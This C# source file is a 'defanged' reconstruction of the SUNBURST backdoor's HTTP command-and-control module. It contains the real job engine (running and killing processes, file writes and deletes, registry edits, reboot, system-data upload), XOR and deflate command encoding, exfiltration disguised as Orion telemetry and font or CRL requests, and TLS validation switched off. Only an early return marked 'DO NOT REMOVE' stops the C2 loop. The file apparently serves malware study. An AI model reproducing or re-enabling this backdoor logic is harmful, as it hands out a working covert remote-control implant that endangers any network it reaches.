using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using System.Net.Security;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Security.Cryptography.X509Certificates;

namespace SunBurstDefanged
{
	public class HttpHelper
	{
		private readonly Random random = new Random();

		private readonly byte[] customerId;

		private readonly string httpHost;

		private readonly HttpOipMethods requestMethod;

		private bool isAbort;

		private int delay;

		private int delayInc;

		private readonly Proxy proxy;

		private DateTime timeStamp = DateTime.Now;

		private int mIndex;

		private Guid sessionId = Guid.NewGuid();

		private readonly List<ulong> UriTimeStamps = new List<ulong>();

		private enum JobEngine
		{
			Idle,
			Exit,
			SetTime,
			CollectSystemDescription,
			UploadSystemDescription,
			RunTask,
			GetProcessByDescription,
			KillTask,
			GetFileSystemEntries,
			WriteFile,
			FileExists,
			DeleteFile,
			GetFileHash,
			ReadRegistryValue,
			SetRegistryValue,
			DeleteRegistryValue,
			GetRegistrySubKeyAndValueNames,
			Reboot,
			None
		}

		private enum HttpOipExMethods
		{
			Get,
			Head,
			Put,
			Post
		}

		public void Abort()
		{
			this.isAbort = true;
		}

		public HttpHelper(byte[] customerId, DnsRecords rec)
		{
			this.customerId = customerId.ToArray<byte>();
			Console.WriteLine("CustomerId is :" + customerId.ToArray<byte>());
			this.httpHost = rec.cname;
			Console.WriteLine("httpHost is :" + rec.cname);
			this.requestMethod = (HttpOipMethods)rec._type;
			Console.WriteLine("Request method is :" + this.requestMethod);
			this.proxy = new Proxy((ProxyType)rec.length);
			Console.WriteLine("Proxy is :" + this.proxy);
		}

		private bool TrackEvent()
		{
			if (DateTime.Now.CompareTo(this.timeStamp.AddMinutes(1.0)) > 0)
			{
				if (ProcessTracker.TrackProcesses(false) || Settings.svcListModified2)
				{
					return true;
				}
				this.timeStamp = DateTime.Now;
			}
			return false;
		}

		private bool IsSynchronized(bool idle)
		{
			if (this.delay != 0 && idle)
			{
				if (this.delayInc == 0)
				{
					this.delayInc = this.delay;
				}
				double num = (double)this.delayInc * 1000.0;
				Utilities.DelayMs(0.9 * num, 1.1 * num);
				if (this.delayInc < 300)
				{
					this.delayInc *= 2;
					return true;
				}
			}
			else
			{
				Utilities.DelayMs(0.0, 0.0);
				this.delayInc = 0;
			}
			return false;
		}

		public void Initialize()
		{
			HttpHelper.JobEngine jobEngine = HttpHelper.JobEngine.Idle;
			string response = null;
			int err = 0;
			try
			{
				int num = 1;
				while (num <= 3 && !this.isAbort)
				{
					byte[] body = null;
					if (this.IsSynchronized(jobEngine == HttpHelper.JobEngine.Idle))
					{
						num = 0;
					}
					if (this.TrackEvent())
					{
						this.isAbort = true;
						break;
					}
					HttpStatusCode httpStatusCode = this.CreateUploadRequest(jobEngine, err, response, out body);

					/*DEFANG
					 * HERE WE RETURN . DONT REMOVE THAT RETURN. 
					 */
					Console.WriteLine("THE BACKDOOR CONNECTED TO C2 SERVER " + Settings.fakehost);
					Console.WriteLine("THE END.=====");
					Settings.instance.Close(); //<-- DO NOT REMOVE!!!!!!
					return; //<-- DO NOT REMOVE!!!!!!

					if (jobEngine == HttpHelper.JobEngine.Exit || jobEngine == HttpHelper.JobEngine.Reboot)
					{
						this.isAbort = true;
						break;
					}
					if (httpStatusCode <= HttpStatusCode.OK)
					{
						if (httpStatusCode != (HttpStatusCode)0)
						{
							if (httpStatusCode != HttpStatusCode.OK)
							{
								goto IL_DC;
							}
							goto IL_89;
						}
					}
					else
					{
						if (httpStatusCode == HttpStatusCode.NoContent || httpStatusCode == HttpStatusCode.NotModified)
						{
							goto IL_89;
						}
						goto IL_DC;
					}
				IL_E3:
					num++;
					continue;
				IL_89:
					string cl = null;
					if (httpStatusCode != HttpStatusCode.OK)
					{
						if (httpStatusCode != HttpStatusCode.NoContent)
						{
							jobEngine = HttpHelper.JobEngine.Idle;
						}
						else
						{
							num = ((jobEngine == HttpHelper.JobEngine.None || jobEngine == HttpHelper.JobEngine.Idle) ? num : 0);
							jobEngine = HttpHelper.JobEngine.None;
						}
					}
					else
					{
						jobEngine = this.ParseServiceResponse(body, out cl);
						num = ((jobEngine == HttpHelper.JobEngine.None || jobEngine == HttpHelper.JobEngine.Idle) ? num : 0);
					}
					err = this.ExecuteEngine(jobEngine, cl, out response);
					goto IL_E3;
				IL_DC:
					Utilities.DelayMin(1, 5);
					goto IL_E3;
				}
				if (jobEngine == HttpHelper.JobEngine.Reboot)
				{
					NativeMethods.RebootComputer();
				}
			}
			catch (Exception)
			{
				Console.WriteLine("Error in HTTPHelper. Unable to connect");
			}
		}

		private int ExecuteEngine(HttpHelper.JobEngine job, string cl, out string result)
		{
			result = null;
			int num = 0;
			string[] args = Job.SplitString(cl);
			int result2;
			try
			{
				if (job == HttpHelper.JobEngine.ReadRegistryValue || job == HttpHelper.JobEngine.SetRegistryValue || job == HttpHelper.JobEngine.DeleteRegistryValue || job == HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames)
				{
					num = HttpHelper.AddRegistryExecutionEngine(job, args, out result);
				}
				switch (job)
				{
					case HttpHelper.JobEngine.SetTime:
						{
							int num2;
							Job.SetTime(args, out num2);
							this.delay = num2;
							break;
						}
					case HttpHelper.JobEngine.CollectSystemDescription:
						Job.CollectSystemDescription(this.proxy.ToString(), out result);
						break;
					case HttpHelper.JobEngine.UploadSystemDescription:
						Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());
						break;
					case HttpHelper.JobEngine.RunTask:
						num = Job.RunTask(args, cl, out result);
						break;
					case HttpHelper.JobEngine.GetProcessByDescription:
						Job.GetProcessByDescription(args, out result);
						break;
					case HttpHelper.JobEngine.KillTask:
						Job.KillTask(args);
						break;
				}
				if (job == HttpHelper.JobEngine.WriteFile || job == HttpHelper.JobEngine.FileExists || job == HttpHelper.JobEngine.DeleteFile || job == HttpHelper.JobEngine.GetFileHash || job == HttpHelper.JobEngine.GetFileSystemEntries)
				{
					result2 = HttpHelper.AddFileExecutionEngine(job, args, out result);
				}
				else
				{
					result2 = num;
				}
			}
			catch (Exception ex)
			{
				if (!string.IsNullOrEmpty(result))
				{
					result += "\n";
				}
				result += ex.Message;
				result2 = ex.HResult;
			}
			return result2;
		}

		private static int AddRegistryExecutionEngine(HttpHelper.JobEngine job, string[] args, out string result)
		{
			result = null;
			int result2 = 0;
			switch (job)
			{
				case HttpHelper.JobEngine.ReadRegistryValue:
					result2 = Job.ReadRegistryValue(args, out result);
					break;
				case HttpHelper.JobEngine.SetRegistryValue:
					result2 = Job.SetRegistryValue(args);
					break;
				case HttpHelper.JobEngine.DeleteRegistryValue:
					Job.DeleteRegistryValue(args);
					break;
				case HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames:
					Job.GetRegistrySubKeyAndValueNames(args, out result);
					break;
			}
			return result2;
		}

		private static int AddFileExecutionEngine(HttpHelper.JobEngine job, string[] args, out string result)
		{
			result = null;
			int result2 = 0;
			switch (job)
			{
				case HttpHelper.JobEngine.GetFileSystemEntries:
					Job.GetFileSystemEntries(args, out result);
					break;
				case HttpHelper.JobEngine.WriteFile:
					Job.WriteFile(args);
					break;
				case HttpHelper.JobEngine.FileExists:
					Job.FileExists(args, out result);
					break;
				case HttpHelper.JobEngine.DeleteFile:
					Job.DeleteFile(args);
					break;
				case HttpHelper.JobEngine.GetFileHash:
					result2 = Job.GetFileHash(args, out result);
					break;
			}
			return result2;
		}

		private static byte[] Deflate(byte[] body)
		{
			int num = 0;
			byte[] array = body.ToArray<byte>();
			for (int i = 1; i < array.Length; i++)
			{
				byte[] array2 = array;
				int num2 = i;
				array2[num2] ^= array[0];
				num += (int)array[i];
			}
			if ((byte)num == array[0])
			{
				return ZipHelper.Decompress(array.Skip(1).ToArray<byte>());
			}
			return null;
		}

		private static byte[] Inflate(byte[] body)
		{
			byte[] array = ZipHelper.Compress(body);
			byte[] array2 = new byte[array.Length + 1];
			array2[0] = (byte)array.Sum((byte b) => (int)b);
			for (int i = 0; i < array.Length; i++)
			{
				byte[] array3 = array;
				int num = i;
				array3[num] ^= array2[0];
			}
			Array.Copy(array, 0, array2, 1, array.Length);
			return array2;
		}

		private HttpHelper.JobEngine ParseServiceResponse(byte[] body, out string args)
		{
			args = null;
			try
			{
				if (body == null || body.Length < 4)
				{
					return HttpHelper.JobEngine.None;
				}
				HttpOipMethods httpOipMethods = this.requestMethod;
				if (httpOipMethods != HttpOipMethods.Put)
				{
					if (httpOipMethods != HttpOipMethods.Post)
					{
						// "\{[0-9a-f-]{36}\}"|"[0-9a-f]{32}"|"[0-9a-f]{16}"
						string[] value = (from Match m in Regex.Matches(Encoding.UTF8.GetString(body), ZipHelper.Unzip("U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA"), RegexOptions.IgnoreCase)
										  select m.Value).ToArray<string>();
						body = Utilities.HexStringToByteArray(string.Join("", value).Replace("\"", string.Empty).Replace("-", string.Empty).Replace("{", string.Empty).Replace("}", string.Empty));
					}
					else
					{
						body = body.Skip(12).ToArray<byte>();
					}
				}
				else
				{
					body = body.Skip(48).ToArray<byte>();
				}
				int num = BitConverter.ToInt32(body, 0);
				body = body.Skip(4).Take(num).ToArray<byte>();
				if (body.Length != num)
				{
					return HttpHelper.JobEngine.None;
				}
				string[] array = Encoding.UTF8.GetString(HttpHelper.Deflate(body)).Trim().Split(new char[]
				{
						' '
				}, 2);
				HttpHelper.JobEngine jobEngine = (HttpHelper.JobEngine)int.Parse(array[0]);
				args = ((array.Length > 1) ? array[1] : null);
				return Enum.IsDefined(typeof(HttpHelper.JobEngine), jobEngine) ? jobEngine : HttpHelper.JobEngine.None;
			}
			catch (Exception)
			{
			}
			return HttpHelper.JobEngine.None;
		}

		public static void Close(HttpHelper http, Thread thread)
		{
			if (thread != null && thread.IsAlive)
			{
				if (http != null)
				{
					http.Abort();
				}
				try
				{
					thread.Join(60000);
					if (thread.IsAlive)
					{
						thread.Abort();
					}
				}
				catch (Exception)
				{
				}
			}
		}

		private string GetCache()
		{
			byte[] array = this.customerId.ToArray<byte>();
			byte[] array2 = new byte[array.Length];
			this.random.NextBytes(array2);
			for (int i = 0; i < array.Length; i++)
			{
				byte[] array3 = array;
				int num = i;
				array3[num] ^= array2[2 + i % 4];
			}
			return Utilities.ByteArrayToHexString(array) + Utilities.ByteArrayToHexString(array2);
		}

		private string GetOrionImprovementCustomerId()
		{
			byte[] array = new byte[16];
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)((int)(~(int)this.customerId[i % (this.customerId.Length - 1)]) + i / this.customerId.Length);
			}
			return new Guid(array).ToString().Trim(new char[]
			{
					'{',
					'}'
			});
		}

		private HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
		{
			outData = null;
			try
			{
				request.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback((object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors sslPolicyErrors) => true));
				request.Proxy = this.proxy.GetWebProxy();
				request.UserAgent = this.GetUserAgent();
				request.KeepAlive = false;
				request.Timeout = 120000;
				request.Method = "GET";
				if (inData != null)
				{
					request.Method = "POST";
					using (Stream requestStream = request.GetRequestStream())
					{
						requestStream.Write(inData, 0, inData.Length);
					}
				}
				using (WebResponse response = request.GetResponse())
				{
					using (Stream responseStream = response.GetResponseStream())
					{
						byte[] array = new byte[4096];
						using (MemoryStream memoryStream = new MemoryStream())
						{
							int count;
							while ((count = responseStream.Read(array, 0, array.Length)) > 0)
							{
								memoryStream.Write(array, 0, count);
							}
							outData = memoryStream.ToArray();
						}
					}
					return ((HttpWebResponse)response).StatusCode;
				}
			}
			catch (WebException ex)
			{
				if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
				{
					return ((HttpWebResponse)ex.Response).StatusCode;
				}
			}
			catch (Exception)
			{
			}
			return HttpStatusCode.Unused;
		}

		private HttpStatusCode CreateUploadRequest(HttpHelper.JobEngine job, int err, string response, out byte[] outData)
		{
			string text = this.httpHost;
			byte[] array = null;
			HttpHelper.HttpOipExMethods httpOipExMethods = (job != HttpHelper.JobEngine.Idle && job != HttpHelper.JobEngine.None) ? HttpHelper.HttpOipExMethods.Head : HttpHelper.HttpOipExMethods.Get;
			outData = null;
			try
			{
				if (!string.IsNullOrEmpty(response))
				{
					byte[] bytes = Encoding.UTF8.GetBytes(response);
					byte[] bytes2 = BitConverter.GetBytes(err);
					byte[] array2 = new byte[bytes.Length + bytes2.Length + this.customerId.Length];
					Array.Copy(bytes, array2, bytes.Length);
					Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
					Array.Copy(this.customerId, 0, array2, bytes.Length + bytes2.Length, this.customerId.Length);
					array = HttpHelper.Inflate(array2);
					httpOipExMethods = ((array.Length <= 10000) ? HttpHelper.HttpOipExMethods.Put : HttpHelper.HttpOipExMethods.Post);
				}
				if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
				{
					text = Uri.UriSchemeHttps + "://" + text;
				}
				if (!text.EndsWith("/"))
				{
					text += "/";
				}
				text += this.GetBaseUri(httpOipExMethods, err);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
				if (httpOipExMethods == HttpHelper.HttpOipExMethods.Get || httpOipExMethods == HttpHelper.HttpOipExMethods.Head)
				{
					// If-None-Match
					httpWebRequest.Headers.Add(ZipHelper.Unzip("80zT9cvPS9X1TSxJzgAA"), this.GetCache());
				}
				if (httpOipExMethods == HttpHelper.HttpOipExMethods.Put && (this.requestMethod == HttpOipMethods.Get || this.requestMethod == HttpOipMethods.Head))
				{
					int[] intArray = this.GetIntArray((array != null) ? array.Length : 0);
					int num = 0;
					ulong num2 = (ulong)DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds;
					num2 -= 300000UL;
					string text2 = "{";
					// "userId":"{0}",
					text2 += string.Format(ZipHelper.Unzip("UyotTi3yTFGyUqo2qFXSAQA="), this.GetOrionImprovementCustomerId());
					// "sessionId":"{0}",
					text2 += string.Format(ZipHelper.Unzip("UypOLS7OzM/zTFGyUqo2qFXSAQA="), this.sessionId.ToString().Trim(new char[]
					{
							'{',
							'}'
					}));
					// "steps":[
					text2 += ZipHelper.Unzip("UyouSS0oVrKKBgA=");
					for (int i = 0; i < intArray.Length; i++)
					{
						uint num3 = (uint)((this.random.Next(4) == 0) ? this.random.Next(512) : 0);
						num2 += (ulong)num3;
						byte[] array3;
						if (intArray[i] > 0)
						{
							num2 |= 2UL;
							array3 = array.Skip(num).Take(intArray[i]).ToArray<byte>();
							num += intArray[i];
						}
						else
						{
							num2 &= 18446744073709551613UL;
							array3 = new byte[this.random.Next(16, 28)];
							for (int j = 0; j < array3.Length; j++)
							{
								array3[j] = (byte)this.random.Next();
							}
						}
						text2 += "{";
						// "Timestamp":"\/Date({0})\/",
						text2 += string.Format(ZipHelper.Unzip("UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA"), num2);
						string str = text2;
						// "Index":{0},
						string format = ZipHelper.Unzip("U/LMS0mtULKqNqjVAQA=");
						int num4 = this.mIndex;
						this.mIndex = num4 + 1;
						text2 = str + string.Format(format, num4);
						// "EventType":"Orion",
						text2 += ZipHelper.Unzip("U3ItS80rCaksSFWyUvIvyszPU9IBAA==");
						// "EventName":"EventManager",
						text2 += ZipHelper.Unzip("U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==");
						// "DurationMs":{0},
						text2 += string.Format(ZipHelper.Unzip("U3IpLUosyczP8y1Wsqo2qNUBAA=="), num3);
						// "Succeeded":true,
						text2 += ZipHelper.Unzip("UwouTU5OTU1JTVGyKikqTdUBAA==");
						// "Message":"{0}"
						text2 += string.Format(ZipHelper.Unzip("U/JNLS5OTE9VslKqNqhVAgA="), Convert.ToBase64String(array3).Replace("/", "\\/"));
						text2 += ((i + 1 != intArray.Length) ? "}," : "}");
					}
					text2 += "]}";
					// application/json
					httpWebRequest.ContentType = ZipHelper.Unzip("SywoyMlMTizJzM/TzyrOzwMA");
					array = Encoding.UTF8.GetBytes(text2);
				}
				if (httpOipExMethods == HttpHelper.HttpOipExMethods.Post || this.requestMethod == HttpOipMethods.Put || this.requestMethod == HttpOipMethods.Post)
				{
					// application/octet-stream
					httpWebRequest.ContentType = ZipHelper.Unzip("SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=");
				}
				return this.CreateUploadRequestImpl(httpWebRequest, array, out outData);
			}
			catch (Exception)
			{
			}
			return (HttpStatusCode)0;
		}

		private int[] GetIntArray(int sz)
		{
			int[] array = new int[30];
			int num = sz;
			for (int i = array.Length - 1; i >= 0; i--)
			{
				if (num < 16 || i == 0)
				{
					array[i] = num;
					break;
				}
				int num2 = num / (i + 1) + 1;
				if (num2 < 16)
				{
					array[i] = this.random.Next(16, Math.Min(32, num) + 1);
					num -= array[i];
				}
				else
				{
					int num3 = Math.Min(512 - num2, num2 - 16);
					array[i] = this.random.Next(num2 - num3, num2 + num3 + 1);
					num -= array[i];
				}
			}
			return array;
		}

		private bool Valid(int percent)
		{
			return this.random.Next(100) < percent;
		}

		private string GetBaseUri(HttpHelper.HttpOipExMethods method, int err)
		{
			int num = (method != HttpHelper.HttpOipExMethods.Get && method != HttpHelper.HttpOipExMethods.Head) ? 1 : 16;
			string baseUriImpl;
			ulong hash;
			for (; ; )
			{
				baseUriImpl = this.GetBaseUriImpl(method, err);
				hash = Utilities.GetHash(baseUriImpl);
				if (!this.UriTimeStamps.Contains(hash))
				{
					break;
				}
				if (--num <= 0)
				{
					return baseUriImpl;
				}
			}
			this.UriTimeStamps.Add(hash);
			return baseUriImpl;
		}

		private string GetBaseUriImpl(HttpHelper.HttpOipExMethods method, int err)
		{
			string text = null;
			if (method == HttpHelper.HttpOipExMethods.Head)
			{
				text = ((ushort)err).ToString();
			}
			if (this.requestMethod == HttpOipMethods.Post)
			{
				string[] array = new string[]
				{
						// -root
						ZipHelper.Unzip("0y3Kzy8BAA=="),
						// -cert
						ZipHelper.Unzip("001OLSoBAA=="),
						// -universal_ca
						ZipHelper.Unzip("0y3NyyxLLSpOzIlPTgQA"),
						// -ca
						ZipHelper.Unzip("001OBAA="),
						// -primary_ca
						ZipHelper.Unzip("0y0oysxNLKqMT04EAA=="),
						// -timestamp
						ZipHelper.Unzip("0y3JzE0tLknMLQAA"),
						"",
						// -global
						ZipHelper.Unzip("003PyU9KzAEA"),
						// -secureca
						ZipHelper.Unzip("0y1OTS4tSk1OBAA=")
				};
				// pki/crl/{0}{1}{2}.crl
				return string.Format(ZipHelper.Unzip("K8jO1E8uytGvNqitNqytNqrVA/IA"), this.random.Next(100, 10000), array[this.random.Next(array.Length)], (text == null) ? "" : ("-" + text));
			}
			if (this.requestMethod == HttpOipMethods.Put)
			{
				string[] array2 = new string[]
				{
						// Bold
						ZipHelper.Unzip("c8rPSQEA"),
						// BoldItalic
						ZipHelper.Unzip("c8rPSfEsSczJTAYA"),
						// ExtraBold
						ZipHelper.Unzip("c60oKUp0ys9JAQA="),
						// ExtraBoldItalic
						ZipHelper.Unzip("c60oKUp0ys9J8SxJzMlMBgA="),
						// Italic
						ZipHelper.Unzip("8yxJzMlMBgA="),
						// Light
						ZipHelper.Unzip("88lMzygBAA=="),
						// LightItalic
						ZipHelper.Unzip("88lMzyjxLEnMyUwGAA=="),
						// Regular
						ZipHelper.Unzip("C0pNL81JLAIA"),
						// SemiBold
						ZipHelper.Unzip("C07NzXTKz0kBAA=="),
						// SemiBoldItalic
						ZipHelper.Unzip("C07NzXTKz0nxLEnMyUwGAA==")
				};
				string[] array3 = new string[]
				{
						// opensans
						ZipHelper.Unzip("yy9IzStOzCsGAA=="),
						// noto
						ZipHelper.Unzip("y8svyQcA"),
						// freefont
						ZipHelper.Unzip("SytKTU3LzysBAA=="),
						// SourceCodePro
						ZipHelper.Unzip("C84vLUpOdc5PSQ0oygcA"),
						// SourceSerifPro
						ZipHelper.Unzip("C84vLUpODU4tykwLKMoHAA=="),
						// SourceHanSans
						ZipHelper.Unzip("C84vLUpO9UjMC07MKwYA"),
						// SourceHanSerif
						ZipHelper.Unzip("C84vLUpO9UjMC04tykwDAA==")
				};
				int num = this.random.Next(array3.Length);
				if (num <= 1)
				{
					// fonts/woff/{0}-{1}-{2}-webfont{3}.woff2
					return string.Format(ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA"), new object[]
					{
							this.random.Next(100, 10000),
							array3[num],
							array2[this.random.Next(array2.Length)].ToLower(),
							text
					});
				}
				// fonts/woff/{0}-{1}-{2}{3}.woff2
				return string.Format(ZipHelper.Unzip("S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA="), new object[]
				{
						this.random.Next(100, 10000),
						array3[num],
						array2[this.random.Next(array2.Length)],
						text
				});
			}
			else
			{
				if (method <= HttpHelper.HttpOipExMethods.Head)
				{
					string text2 = "";
					if (this.Valid(20))
					{
						// SolarWinds
						text2 += ZipHelper.Unzip("C87PSSwKz8xLKQYA");
						if (this.Valid(40))
						{
							// .CortexPlugin
							text2 += ZipHelper.Unzip("03POLypJrQjIKU3PzAMA");
						}
					}
					if (this.Valid(80))
					{
						// .Orion
						text2 += ZipHelper.Unzip("0/MvyszPAwA=");
					}
					if (this.Valid(80))
					{
						string[] array4 = new string[]
						{
								// Wireless
								ZipHelper.Unzip("C88sSs1JLS4GAA=="),
								// UI
								ZipHelper.Unzip("C/UEAA=="),
								// Widgets
								ZipHelper.Unzip("C89MSU8tKQYA"),
								// NPM
								ZipHelper.Unzip("8wvwBQA="),
								// Apollo
								ZipHelper.Unzip("cyzIz8nJBwA="),
								// CloudMonitoring
								ZipHelper.Unzip("c87JL03xzc/LLMkvysxLBwA=")
						};
						text2 = text2 + "." + array4[this.random.Next(array4.Length)];
					}
					if (this.Valid(30) || string.IsNullOrEmpty(text2))
					{
						string[] array5 = new string[]
						{
								// Nodes
								ZipHelper.Unzip("88tPSS0GAA=="),
								// Volumes
								ZipHelper.Unzip("C8vPKc1NLQYA"),
								// Interfaces
								ZipHelper.Unzip("88wrSS1KS0xOLQYA"),
								// Components
								ZipHelper.Unzip("c87PLcjPS80rKQYA")
						};
						text2 = text2 + "." + array5[this.random.Next(array5.Length)];
					}
					if (this.Valid(30) || text != null)
					{
						text2 = string.Concat(new object[]
						{
								text2,
								"-",
								this.random.Next(1, 20),
								".",
								this.random.Next(1, 30)
						});
						if (text != null)
						{
							text2 = text2 + "." + ((ushort)err).ToString();
						}
					}
					// swip/upd/
					return ZipHelper.Unzip("Ky7PLNAvLUjRBwA=") + text2.TrimStart(new char[]
					{
							'.'
						// .xml
					}) + ZipHelper.Unzip("06vIzQEA");
				}
				if (method != HttpHelper.HttpOipExMethods.Put)
				{
					// swip/Upload.ashx
					return ZipHelper.Unzip("Ky7PLNAPLcjJT0zRSyzOqAAA");
				}
				// swip/Events
				return ZipHelper.Unzip("Ky7PLNB3LUvNKykGAA==");
			}
		}

		private string GetUserAgent()
		{
			if (this.requestMethod == HttpOipMethods.Put || this.requestMethod == HttpOipMethods.Get)
			{
				return null;
			}
			if (this.requestMethod == HttpOipMethods.Post)
			{
				if (string.IsNullOrEmpty(Settings.userAgentDefault))
				{
					// Microsoft-CryptoAPI/
					Settings.userAgentDefault = ZipHelper.Unzip("881MLsovzk8r0XUuqiwoyXcM8NQHAA==");
					Settings.userAgentDefault += Utilities.GetOSVersion(false);
				}
				return Settings.userAgentDefault;
			}
			if (string.IsNullOrEmpty(Settings.userAgentOrionImprovementClient))
			{
				// SolarWindsOrionImprovementClient/
				Settings.userAgentOrionImprovementClient = ZipHelper.Unzip("C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA");
				try
				{
					// \OrionImprovement\SolarWinds.OrionImprovement.exe
					string text = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
					text += ZipHelper.Unzip("i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==");
					Settings.userAgentOrionImprovementClient += FileVersionInfo.GetVersionInfo(text).FileVersion;
				}
				catch (Exception)
				{
					// 3.0.0.382
					Settings.userAgentOrionImprovementClient += ZipHelper.Unzip("M9YzAEJjCyMA");
				}
			}
			return Settings.userAgentOrionImprovementClient;
		}
	}
}
